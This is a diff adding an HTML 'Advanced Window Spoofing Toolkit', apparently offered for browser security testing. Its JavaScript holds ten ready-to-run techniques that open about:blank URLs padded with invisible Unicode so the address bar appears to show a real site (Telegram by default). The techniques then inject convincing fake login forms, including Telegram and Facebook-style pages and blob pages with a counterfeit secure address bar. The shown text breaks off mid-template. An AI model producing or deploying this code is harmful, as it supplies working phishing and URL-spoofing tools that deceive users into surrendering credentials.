@@ -1,0 +1,1212 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced Window Spoofing Toolkit</title>
+    <meta charset="utf-8">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: #e2e8f0;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: rgba(30, 41, 59, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+            overflow: hidden;
+            border: 1px solid #334155;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+            border-bottom: 5px solid #5b21b6;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
+        }
+        
+        .header .subtitle {
+            color: #cbd5e1;
+            font-size: 1.1em;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .controls-panel {
+            padding: 25px;
+            background: #1e293b;
+            border-bottom: 1px solid #334155;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        
+        .control-group {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .control-group label {
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #94a3b8;
+        }
+        
+        .control-group input,
+        .control-group select {
+            padding: 12px 15px;
+            background: #0f172a;
+            border: 2px solid #475569;
+            border-radius: 10px;
+            font-size: 14px;
+            color: #e2e8f0;
+            transition: all 0.3s;
+        }
+        
+        .control-group input:focus,
+        .control-group select:focus {
+            outline: none;
+            border-color: #7c3aed;
+            box-shadow: 0 0 0 3px rgba(124, 58, 237, 0.2);
+        }
+        
+        .techniques-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            padding: 30px;
+            min-height: 600px;
+        }
+        
+        .technique-list {
+            background: #1e293b;
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid #334155;
+            overflow-y: auto;
+            max-height: 800px;
+        }
+        
+        .technique-preview {
+            background: #0f172a;
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid #334155;
+            overflow-y: auto;
+        }
+        
+        .technique-item {
+            background: #334155;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid #475569;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .technique-item:hover {
+            background: #475569;
+            transform: translateX(5px);
+            border-color: #7c3aed;
+        }
+        
+        .technique-item.active {
+            background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
+            border-color: #8b5cf6;
+        }
+        
+        .technique-title {
+            font-size: 1.1em;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: white;
+        }
+        
+        .technique-desc {
+            font-size: 0.9em;
+            color: #cbd5e1;
+            line-height: 1.5;
+        }
+        
+        .tech-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            font-size: 0.8em;
+            margin-top: 8px;
+        }
+        
+        .preview-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #334155;
+        }
+        
+        .preview-title {
+            font-size: 1.3em;
+            font-weight: 600;
+            color: white;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .btn {
+            padding: 12px 25px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
+            color: white;
+            flex: 1;
+        }
+        
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #6d28d9 0%, #4338ca 100%);
+            box-shadow: 0 5px 15px rgba(124, 58, 237, 0.4);
+            transform: translateY(-2px);
+        }
+        
+        .btn-secondary {
+            background: #475569;
+            color: white;
+        }
+        
+        .btn-secondary:hover {
+            background: #334155;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: linear-gradient(135deg, #b91c1c 0%, #991b1b 100%);
+        }
+        
+        .code-editor {
+            background: #1e293b;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid #334155;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .code-block {
+            background: #0f172a;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 10px;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            border: 1px solid #334155;
+        }
+        
+        .log-panel {
+            margin: 30px;
+            background: #0f172a;
+            color: #cbd5e1;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #334155;
+        }
+        
+        .log-header {
+            background: #1e293b;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .log-content {
+            padding: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-family: 'Consolas', monospace;
+            font-size: 13px;
+        }
+        
+        .log-entry {
+            padding: 8px 0;
+            border-bottom: 1px solid #334155;
+            display: flex;
+            gap: 15px;
+        }
+        
+        .log-time {
+            color: #94a3b8;
+            min-width: 70px;
+        }
+        
+        .log-message {
+            color: #e2e8f0;
+            flex: 1;
+        }
+        
+        .log-type-info { color: #60a5fa; }
+        .log-type-success { color: #10b981; }
+        .log-type-warning { color: #f59e0b; }
+        .log-type-error { color: #ef4444; }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .status-active { background: #10b981; animation: pulse 2s infinite; }
+        .status-inactive { background: #ef4444; }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .feature-tag {
+            display: inline-block;
+            padding: 3px 8px;
+            background: rgba(124, 58, 237, 0.2);
+            border-radius: 5px;
+            font-size: 0.8em;
+            margin-right: 5px;
+            margin-bottom: 5px;
+            color: #c4b5fd;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Advanced Window Spoofing Toolkit</h1>
+            <p class="subtitle">Real Techniques for Browser Security Testing - Focus on about:blank Parameter Manipulation</p>
+        </div>
+
+        <div class="controls-panel">
+            <div class="control-group">
+                <label for="targetUrl">Target URL</label>
+                <input type="text" id="targetUrl" value="https://web.telegram.org" placeholder="https://example.com">
+            </div>
+            <div class="control-group">
+                <label for="spoofDomain">Spoof Domain</label>
+                <input type="text" id="spoofDomain" value="telegram.org" placeholder="Domain to spoof">
+            </div>
+            <div class="control-group">
+                <label for="windowSize">Window Size</label>
+                <select id="windowSize">
+                    <option value="400,600">Small (400x600)</option>
+                    <option value="500,700" selected>Medium (500x700)</option>
+                    <option value="600,800">Large (600x800)</option>
+                    <option value="800,1000">Full (800x1000)</option>
+                    <option value="1024,768">Desktop (1024x768)</option>
+                </select>
+            </div>
+            <div class="control-group">
+                <label for="delay">Open Delay (ms)</label>
+                <input type="number" id="delay" value="100" min="0" max="5000" step="100">
+            </div>
+        </div>
+
+        <div class="techniques-container">
+            <!-- Left Column: Technique List -->
+            <div class="technique-list">
+                <h3 style="color: white; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 1px solid #475569;">Available Techniques</h3>
+                
+                <div class="technique-item active" onclick="selectTechnique('aboutBlankDot')">
+                    <div class="technique-title">1. about:blank?.https://</div>
+                    <div class="technique-desc">Original technique with dot parameter: about:blank?.https://domain.com</div>
+                    <span class="tech-badge">Basic</span>
+                    <span class="tech-badge">Tab/Window</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('aboutBlankPipe')">
+                    <div class="technique-title">2. about:blank?|⠀https://</div>
+                    <div class="technique-desc">Using pipe character: about:blank?|⠀https://telegram.org</div>
+                    <span class="tech-badge">Basic</span>
+                    <span class="tech-badge">Tab</span>
+                    <span class="tech-badge">Unicode</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('aboutBlankSpace')">
+                    <div class="technique-title">3. about:blank?⠀https://</div>
+                    <div class="technique-desc">Using invisible spaces (U+2800): about:blank?⠀https://</div>
+                    <span class="tech-badge">Stealth</span>
+                    <span class="tech-badge">Tab</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('aboutBlankDouble')">
+                    <div class="technique-title">4. Double about:blank</div>
+                    <div class="technique-desc">Nested about:blank windows: about:blank?about:blank?.https://</div>
+                    <span class="tech-badge">Advanced</span>
+                    <span class="tech-badge">Chain</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('blobAddressBar')">
+                    <div class="technique-title">5. Blob + Address Bar Spoof</div>
+                    <div class="technique-desc">Blob URL with fake address bar showing example.com</div>
+                    <span class="tech-badge">Blob</span>
+                    <span class="tech-badge">Spoof</span>
+                    <span class="tech-badge">Tab</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('metaStyle')">
+                    <div class="technique-title">6. Meta Style (Full HTML)</div>
+                    <div class="technique-desc">Complete HTML injection with setTimeout like original Meta example</div>
+                    <span class="tech-badge">HTML</span>
+                    <span class="tech-badge">Full</span>
+                    <span class="tech-badge">Tab</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('aboutBlankSlash')">
+                    <div class="technique-title">7. about:blank?/https://</div>
+                    <div class="technique-desc">Using forward slash: about:blank?/https://domain.com</div>
+                    <span class="tech-badge">Basic</span>
+                    <span class="tech-badge">Tab</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('aboutBlankColon')">
+                    <div class="technique-title">8. about:blank?:https://</div>
+                    <div class="technique-desc">Using colon separator: about:blank?:https://domain.com</div>
+                    <span class="tech-badge">Basic</span>
+                    <span class="tech-badge">Window</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('blobFullSpoof')">
+                    <div class="technique-title">9. Blob Full Spoof (example.com)</div>
+                    <div class="technique-desc">Complete Blob URL spoof with full example.com simulation</div>
+                    <span class="tech-badge">Blob</span>
+                    <span class="tech-badge">Complete</span>
+                    <span class="tech-badge">Tab</span>
+                </div>
+                
+                <div class="technique-item" onclick="selectTechnique('aboutBlankUnicodeMix')">
+                    <div class="technique-title">10. Unicode Mix</div>
+                    <div class="technique-desc">Multiple Unicode characters mixed: about:blank?‌‍https://</div>
+                    <span class="tech-badge">Advanced</span>
+                    <span class="tech-badge">Unicode</span>
+                    <span class="tech-badge">Stealth</span>
+                </div>
+            </div>
+
+            <!-- Right Column: Technique Preview & Controls -->
+            <div class="technique-preview">
+                <div class="preview-header">
+                    <div class="preview-title" id="selectedTechTitle">about:blank?.https:// Technique</div>
+                    <div>
+                        <span class="status-indicator status-active"></span>
+                        <span style="color: #94a3b8; font-size: 0.9em;">Ready</span>
+                    </div>
+                </div>
+                
+                <div id="techDescription">
+                    <p style="color: #cbd5e1; margin-bottom: 15px; line-height: 1.6;">
+                        Opens a new window/tab with about:blank URL containing dot parameter that spoofs the target domain.
+                    </p>
+                    
+                    <div class="feature-tag">Opens in new tab/window</div>
+                    <div class="feature-tag">Basic about:blank parameter</div>
+                    <div class="feature-tag">URL Spoofing</div>
+                </div>
+                
+                <div class="code-editor">
+                    <div style="color: #94a3b8; margin-bottom: 10px; font-size: 0.9em;">Preview Code:</div>
+                    <div class="code-block" id="codePreview">
+// Default code preview
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="executeSelectedTechnique()">
+                        <span>▶</span> Execute Technique
+                    </button>
+                    <button class="btn btn-secondary" onclick="openInNewTab()">
+                        <span>↗</span> Open in New Tab
+                    </button>
+                    <button class="btn btn-secondary" onclick="copyCode()">
+                        <span>📋</span> Copy Code
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="log-panel">
+            <div class="log-header">
+                <div>
+                    <span class="status-indicator status-active"></span>
+                    <strong>Execution Log</strong>
+                    <span style="color: #94a3b8; font-size: 0.9em; margin-left: 10px;" id="logCount">0 entries</span>
+                </div>
+                <div>
+                    <button class="btn btn-secondary" onclick="clearLog()" style="padding: 8px 15px; font-size: 0.9em;">Clear</button>
+                    <button class="btn btn-secondary" onclick="exportLog()" style="padding: 8px 15px; font-size: 0.9em;">Export</button>
+                </div>
+            </div>
+            <div class="log-content" id="logContent">
+                <!-- Log entries will appear here -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global Configuration
+        const config = {
+            targetUrl: 'https://web.telegram.org',
+            spoofDomain: 'telegram.org',
+            windowSize: '500,700',
+            delay: 100,
+            currentTechnique: 'aboutBlankDot'
+        };
+
+        // Log System
+        const logSystem = {
+            entries: [],
+            types: {
+                info: 'log-type-info',
+                success: 'log-type-success',
+                warning: 'log-type-warning',
+                error: 'log-type-error'
+            },
+            
+            add: function(message, type = 'info') {
+                const timestamp = new Date().toLocaleTimeString([], {hour12: false});
+                const entry = {
+                    time: timestamp,
+                    message: message,
+                    type: type
+                };
+                
+                this.entries.push(entry);
+                this.updateDisplay();
+                this.updateCount();
+                
+                // Console output for debugging
+                console.log(`[${timestamp}] ${message}`);
+            },
+            
+            updateDisplay: function() {
+                const logContent = document.getElementById('logContent');
+                logContent.innerHTML = this.entries.map(entry => `
+                    <div class="log-entry">
+                        <div class="log-time">${entry.time}</div>
+                        <div class="log-message ${this.types[entry.type]}">${entry.message}</div>
+                    </div>
+                `).join('');
+                
+                logContent.scrollTop = logContent.scrollHeight;
+            },
+            
+            updateCount: function() {
+                document.getElementById('logCount').textContent = `${this.entries.length} entries`;
+            },
+            
+            clear: function() {
+                this.entries = [];
+                this.updateDisplay();
+                this.updateCount();
+                this.add('Log cleared', 'info');
+            },
+            
+            export: function() {
+                const logText = this.entries.map(entry => 
+                    `[${entry.time}] ${entry.message}`
+                ).join('\n');
+                
+                const blob = new Blob([logText], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `spoofing-log-${new Date().toISOString().slice(0,10)}.txt`;
+                a.click();
+                URL.revokeObjectURL(url);
+                
+                this.add('Log exported to file', 'success');
+            }
+        };
+
+        // Update configuration from UI
+        function updateConfig() {
+            config.targetUrl = document.getElementById('targetUrl').value;
+            config.spoofDomain = document.getElementById('spoofDomain').value;
+            config.windowSize = document.getElementById('windowSize').value;
+            config.delay = parseInt(document.getElementById('delay').value);
+            
+            logSystem.add(`Configuration updated: ${config.targetUrl}`, 'info');
+        }
+
+        // Select technique
+        function selectTechnique(techId) {
+            config.currentTechnique = techId;
+            
+            // Update UI
+            document.querySelectorAll('.technique-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            event.currentTarget.classList.add('active');
+            
+            // Update preview based on selected technique
+            updateTechniquePreview();
+        }
+
+        // Update technique preview
+        function updateTechniquePreview() {
+            const techniques = {
+                aboutBlankDot: {
+                    title: 'about:blank?.https:// Technique',
+                    description: 'Original technique using dot parameter. Opens new window with spoofed URL.',
+                    code: `// about:blank?.https:// technique
+const url = \`about:blank?.${config.targetUrl}\`;
+const win = window.open(url, 'spoof_window', \`width=${config.windowSize.split(',')[0]},height=${config.windowSize.split(',')[1]}\`);
+
+setTimeout(() => {
+    if (win && !win.closed) {
+        win.document.body.innerHTML = \`
+            <h2>Loading ${config.spoofDomain}...</h2>
+            <p>Please wait while we connect securely.</p>
+        \`;
+    }
+}, ${config.delay});`
+                },
+                
+                aboutBlankPipe: {
+                    title: 'about:blank?|⠀https:// Technique',
+                    description: 'Using pipe character with invisible space (U+2800) for obfuscation.',
+                    code: `// about:blank?|⠀https:// technique (U+2800 invisible space)
+const url = \`about:blank?|\u2800${config.targetUrl}\`;
+const win = window.open(url, 'pipe_window', \`width=${config.windowSize.split(',')[0]},height=${config.windowSize.split(',')[1]}\`);
+
+// Pipe character creates visual separation
+setTimeout(() => {
+    if (win && !win.closed) {
+        win.document.title = \`${config.spoofDomain} - Secure Login\`;
+        win.document.body.innerHTML = \`
+            <div style="padding: 40px; font-family: Arial;">
+                <h2 style="color: #0088cc;">Telegram Web</h2>
+                <input placeholder="Phone number" style="padding: 10px; width: 100%; margin: 10px 0;">
+                <button style="padding: 10px 20px; background: #0088cc; color: white;">Next</button>
+            </div>
+        \`;
+    }
+}, ${config.delay});`
+                },
+                
+                aboutBlankSpace: {
+                    title: 'about:blank?⠀https:// Technique',
+                    description: 'Using Braille Pattern Blank (U+2800) invisible character for stealth.',
+                    code: `// about:blank with invisible space (U+2800)
+const invisibleSpace = '\\u2800'; // Braille Pattern Blank
+const url = \`about:blank?\${invisibleSpace}${config.targetUrl}\`;
+const win = window.open(url, 'stealth_window');
+
+// Completely invisible in URL bar
+setTimeout(() => {
+    if (win && !win.closed) {
+        win.document.body.innerHTML = \`
+            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
+                         background: url('https://${config.spoofDomain}/favicon.ico') center center no-repeat #f0f0f0;">
+                <div style="position: absolute; bottom: 20px; width: 100%; text-align: center; color: #666;">
+                    Loading ${config.spoofDomain}...
+                </div>
+            </div>
+        \`;
+    }
+}, ${config.delay});`
+                },
+                
+                aboutBlankDouble: {
+                    title: 'Double about:blank Technique',
+                    description: 'Nested about:blank windows for additional obfuscation.',
+                    code: `// Double about:blank technique
+const url = \`about:blank?about:blank?.${config.targetUrl}\`;
+const win = window.open(url, 'double_window', \`width=600,height=400\`);
+
+// Two-layer obfuscation
+setTimeout(() => {
+    if (win && !win.closed) {
+        // Create another about:blank inside
+        const nestedUrl = \`about:blank?.${config.targetUrl}\`;
+        win.location.href = nestedUrl;
+        
+        setTimeout(() => {
+            win.document.body.innerHTML = \`
+                <div style="text-align: center; padding: 50px;">
+                    <h3>🔒 ${config.spoofDomain.toUpperCase()} SECURE CONNECTION</h3>
+                    <p>Establishing encrypted tunnel...</p>
+                    <div style="width: 200px; height: 4px; background: #ddd; margin: 20px auto; border-radius: 2px;">
+                        <div style="width: 70%; height: 100%; background: #0088cc; border-radius: 2px;"></div>
+                    </div>
+                </div>
+            \`;
+        }, 500);
+    }
+}, ${config.delay});`
+                },
+                
+                blobAddressBar: {
+                    title: 'Blob + Address Bar Spoof',
+                    description: 'Blob URL with fake address bar showing example.com',
+                    code: `// Blob URL with address bar spoofing
+const fakeHTML = \`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>example.com - Secure Portal</title>
+    <style>
+        body { margin: 0; font-family: Arial, sans-serif; }
+        .address-bar {
+            background: #f8f9fa;
+            padding: 10px 15px;
+            border-bottom: 1px solid #dee2e6;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+        }
+        .url-display {
+            color: #007bff;
+            font-family: monospace;
+            margin-left: 10px;
+            flex-grow: 1;
+        }
+        .secure-badge {
+            background: #28a745;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 12px;
+        }
+        .content {
+            padding: 40px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="address-bar">
+        <span style="color: #28a745;">🔒</span>
+        <span class="url-display">https://example.com</span>
+        <span class="secure-badge">Secure</span>
+    </div>
+    <div class="content">
+        <h2>example.com Security Portal</h2>
+        <p>This is a simulated address bar showing example.com</p>
+        <p>Actual content loaded from Blob URL</p>
+        <input type="text" placeholder="Enter username" style="padding: 10px; margin: 10px; width: 200px;">
+        <br>
+        <button style="padding: 10px 20px; background: #007bff; color: white;">Login</button>
+    </div>
+</body>
+</html>
+\`;
+
+const blob = new Blob([fakeHTML], { type: 'text/html' });
+const blobUrl = URL.createObjectURL(blob);
+const win = window.open(blobUrl, 'blob_spoof', \`width=600,height=500\`);
+
+// Cleanup
+setTimeout(() => {
+    if (win.closed) {
+        URL.revokeObjectURL(blobUrl);
+    }
+}, 10000);`
+                },
+                
+                metaStyle: {
+                    title: 'Meta Style Full HTML Injection',
+                    description: 'Complete HTML injection with setTimeout like original Meta example.',
+                    code: `// Meta-style full HTML injection
+var j = '';
+function openMetaStyle() {
+    j = window.open(\`about:blank?.${config.targetUrl}\`, 'meta_window');
+    
+    setTimeout(() => {
+        if (j && !j.closed) {
+            j.document.body.innerHTML = \`
+                <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;font-family:Arial, sans-serif;background:#f0f2f5;margin:0;">
+                    
+                    <!-- Logo -->
+                    <div style="margin-bottom:30px;text-align:center;">
+                        <img src="https://${config.spoofDomain}/favicon.ico" alt="${config.spoofDomain} Logo" style="width:120px;height:auto;border-radius:10px;">
+                    </div>
+                    
+                    <!-- Login Card -->
+                    <div style="background:white;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:360px;text-align:center;">
+                        <h2 style="margin-bottom:20px;color:#1c1e21;">Log into ${config.spoofDomain}</h2>
+                        
+                        <input id="user" type="text" placeholder="Email or Phone" 
+                            style="width:100%;padding:12px;margin-bottom:15px;font-size:16px;border:1px solid #ddd;border-radius:6px;">
+                        
+                        <input id="pass" type="password" placeholder="Password" 
+                            style="width:100%;padding:12px;margin-bottom:20px;font-size:16px;border:1px solid #ddd;border-radius:6px;">
+                        
+                        <button onclick="alert('Submitted: ' + document.getElementById('user').value)" 
+                            style="width:100%;padding:14px;font-size:18px;background:#1877f2;color:white;border:none;border-radius:6px;cursor:pointer;">
+                            Log In
+                        </button>
+                        
+                        <div style="margin-top:20px;">
+                            <a href="#" style="color:#1877f2;text-decoration:none;font-size:14px;">Forgotten password?</a>
+                        </div>
+                    </div>
+                    
+                    <!-- Footer -->
+                    <div style="margin-top:30px;font-size:14px;color:#606770;">
+                        <p>Don't have an account? <a href="#" style="color:#1877f2;text-decoration:none;">Sign up</a></p>
+                    </div>
+                </div>
+            \`;
+        }
+    }, ${config.delay});
+}
+
+// Execute
+openMetaStyle();`
+                },
+                
+                aboutBlankSlash: {
+                    title: 'about:blank?/https:// Technique',
+                    description: 'Using forward slash separator in about:blank parameter.',
+                    code: `// about:blank?/https:// technique
+const url = \`about:blank?/${config.targetUrl}\`;
+const win = window.open(url, 'slash_window', \`width=${config.windowSize.split(',')[0]},height=${config.windowSize.split(',')[1]}\`);
+
+// Forward slash creates path-like appearance
+setTimeout(() => {
+    if (win && !win.closed) {
+        win.document.body.innerHTML = \`
+            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; padding: 40px; color: white;">
+                <h1>${config.spoofDomain}</h1>
+                <p>Secure login portal</p>
+                <input type="text" placeholder="Username" style="padding: 10px; margin: 10px 0; width: 200px;">
+                <br>
+                <button style="padding: 10px 20px; background: white; color: #764ba2; border: none;">Continue</button>
+            </div>
+        \`;
+    }
+}, ${config.delay});`
+                },
+                
+                aboutBlankColon: {
+                    title: 'about:blank?:https:// Technique',
+                    description: 'Using colon separator for parameter value.',
+                    code: `// about:blank?:https:// technique
+const url = \`about:blank?:${config.targetUrl}\`;
+const win = window.open(url, 'colon_window', \`width=${config.windowSize.split(',')[0]},height=${config.windowSize.split(',')[1]}\`);
+
+// Colon separator technique
+setTimeout(() => {
+    if (win && !win.closed) {
+        // Simulate secure connection
+        win.document.title = \`${config.spoofDomain} - Secure\`;
+        win.document.body.innerHTML = \`
+            <div style="text-align: center; padding-top: 100px;">
+                <div style="font-size: 48px; margin-bottom: 20px;">🔐</div>
+                <h2>${config.spoofDomain} Security</h2>
+                <p>Verifying your connection...</p>
+                <div style="width: 100px; height: 4px; background: #ddd; margin: 30px auto; border-radius: 2px;">
+                    <div id="progress" style="width: 0%; height: 100%; background: #28a745; border-radius: 2px;"></div>
+                </div>
+                <script>
+                    let width = 0;
+                    const interval = setInterval(() => {
+                        width += 10;
+                        document.getElementById('progress').style.width = width + '%';
+                        if (width >= 100) clearInterval(interval);
+                    }, 100);
+                <\/script>
+            </div>
+        \`;
+    }
+}, ${config.delay});`
+                },
+                
+                blobFullSpoof: {
+                    title: 'Blob Full Spoof (example.com)',
+                    description: 'Complete Blob URL spoof with full example.com simulation.',
+                    code: `// Complete example.com spoof with Blob
+const exampleSpoofHTML = \`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>example.com - Your Trusted Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            box-shadow: 0 0 50px rgba(0,0,0,0.1);
+        }
+        .header {
+            background: #f8f9fa;
+            padding: 20px;
+            border-bottom: 1px solid #dee2e6;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #007bff;
+        }
+        .nav a {
+            margin-left: 20px;
+            color: #6c757d;
+            text-decoration: none;
+        }
+        .hero {
+            padding: 60px 40px;
+            text-align: center;
+            background: linear-gradient(rgba(102, 126, 234, 0.1), white);
+        }
+        .hero h1 {
+            font-size: 36px;
+            margin-bottom: 20px;
+            color: #495057;
+        }
+        .login-box {
+            background: #f8f9fa;
+            padding: 40px;
+            margin: 40px auto;
+            max-width: 400px;
+            border-radius: 10px;
+            border: 1px solid #dee2e6;
+        }
+        .login-box h2 {
+            margin-bottom: 20px;
+            color: #495057;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #6c757d;
+            border-top: 1px solid #dee2e6;
+            margin-top: 40px;
+        }
+        .security-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px 0;
+            color: #856404;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">example.com</div>
+            <div class="nav">
+                <a href="#">Home</a>
+                <a href="#">Services</a>
+                <a href="#">Contact</a>
+            </div>
+        </div>
+        
+        <div class="hero">
+            <h1>Welcome to Example.com</h1>
+            <p>Your trusted partner for secure online services</p>
+        </div>
+        
+        <div class="login-box">
+            <h2>Secure Login</h2>
+            <div class="security-notice">
+                🔒 Secure connection established
+            </div>
+            <input type="email" placeholder="Email address" id="loginEmail">
+            <input type="password" placeholder="Password" id="loginPassword">
+            <button onclick="handleLogin()">Sign In</button>
+            <p style="margin-top: 15px; font-size: 14px; color: #6c757d;">
+                <a href="#">Forgot password?</a> | <a href="#">Create account</a>
+            </p>
+        </div>
+        
+        <div class="footer">
+            <p>© 2024 example.com. All rights reserved.</p>
+            <p style="font-size: 12px; margin-top: 10px;">
+                <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
+            </p>
+        </div>
+    </div>
+    
+    <script>
+        function handleLogin() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            if(email && password) {
+                alert('Login attempt recorded:\\nEmail: ' + email);
+                // Simulate successful login
+                document.querySelector('.login-box').innerHTML = \`
+                    <div style="text-align: center; padding: 20px;">
+                        <div style="font-size: 48px; color: #28a745;">✓</div>
+                        <h3>Login Successful!</h3>
+                        <p>Redirecting to your dashboard...</p>
+                    </div>
+                \`;
+                
+                setTimeout(() => {
+                    // In real scenario, redirect to actual target
+                    // window.location.href = '${config.targetUrl}';
+                }, 2000);
+            } else {
+                alert('Please fill in all fields');
+            }
+        }
+        
+        // Focus on email field
+        setTimeout(() => {
+            document.getElementById('loginEmail')?.focus();
+        }, 500);
+    <\/script>
+</body>
+</html>
+\`;
+
+const blob = new Blob([exampleSpoofHTML], { type: 'text/html' });
+const blobUrl = URL.createObjectURL(blob);
+const win = window.open(blobUrl, 'example_spoof', \`width=850,height=700,resizable=yes\`);
+
+// Cleanup when closed
+const cleanup = setInterval(() => {
+    if (win.closed) {
+        URL.revokeObjectURL(blobUrl);
+        clearInterval(cleanup);
+    }
+}, 1000);`
+                },
+                
+                aboutBlankUnicodeMix: {
+                    title: 'Unicode Mix Technique',
+                    description: 'Multiple Unicode characters mixed for advanced obfuscation.',
+                    code: `// Unicode mix technique (multiple invisible chars)
+const unicodeMix = '\\u200B\\u200C\\u200D\\uFEFF'; // ZWSP, ZWNJ, ZWJ, BOM
+const url = \`about:blank?\${unicodeMix}${config.targetUrl}\`;
+const win = window.open(url, 'unicode_mix_window');
+
+// Advanced Unicode obfuscation
+setTimeout(() => {
+    if (win && !win.closed) {
+        // Create convincing fake page
+        win.document.title = \`${config.spoofDomain} - Loading\`;
+        win.document.body.innerHTML = \`
+            <div style="
+                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+                color: white;
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                font-family: monospace;
+            ">
+                <div style="font-size: 48px; margin-bottom: 20px;">🛡️</div>
+                <h2>SECURE CONNECTION INITIALIZED</h2>
